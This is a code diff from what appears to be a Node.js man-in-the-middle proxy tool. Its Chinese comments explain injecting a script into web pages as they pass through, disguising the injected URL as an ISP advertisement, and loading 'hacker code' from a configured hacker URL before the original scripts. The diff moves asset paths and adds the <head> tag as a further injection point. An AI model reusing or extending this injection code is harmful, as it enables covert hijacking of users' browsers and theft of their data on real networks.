@@ -1,4 +1,4 @@
-'use strict';
+﻿'use strict';
 
 var proxyDns = require('./proxy_dns.js'),
 	proxyWeb = require('./proxy_web.js'),
@@ -29,7 +29,7 @@ var INJECT_JS;
 //   当然实际不用这个文件名，而是伪装成其他的url，例如运营商的广告^_^
 //   具体INJECT_URL值可以在config.json里配置
 //
-var INJECT_FILE = './asset/inject.js';
+var INJECT_FILE = './asset/inject/extern.js';
 var INJECT_URL = config['inject_url'].replace('http://', '');
 
 
@@ -49,18 +49,13 @@ function updateInjectJs() {
 
 
 // 载入常用脚本库url
-var LIB_LIST = './asset/list.txt';
+var LIB_LIST = './asset/commlib/list.txt';
 
 function parseList() {
 	jslib_list = Read(LIB_LIST).split('\n');
 
 	jslib_list.forEach(function(url) {
 		jslib_map[url] = true;
-
-		// 顺便把常用脚本库所在的域名划入web_domain
-		var domain = url.split('/')[0];
-		proxyDns.addWebDomain(domain);
-
 	});
 
 	updateInjectJs();
@@ -76,7 +71,7 @@ parseList();
 // - 加载hacker代码
 // - 加载原始脚本内容（在未来用户浏览时加载，让页面正常运行）
 //
-var stubCode = Read('asset/stub.js')
+var stubCode = Read('asset/commlib/stub.js')
 	.replace('$URL_HACKER', config['hacker_url']);
 
 
@@ -124,9 +119,9 @@ exports.injectHtml = function(html, charset) {
 			: iconv.decode(html, charset);
 
 	//
-	// 尝试在 </title>, <body>, </html> 标签后注入
+	// 尝试在 </title>, <head>, <body>, </html> 标签后注入
 	//
-	html = html.replace(/<\/title>|<body>|<body\s+[^>]*>|.$/i,
+	html = html.replace(/<\/title>|<head>|<body>|<body\s+[^>]*>|.$/i,
 		'$&' + injectCode);
 
 	//
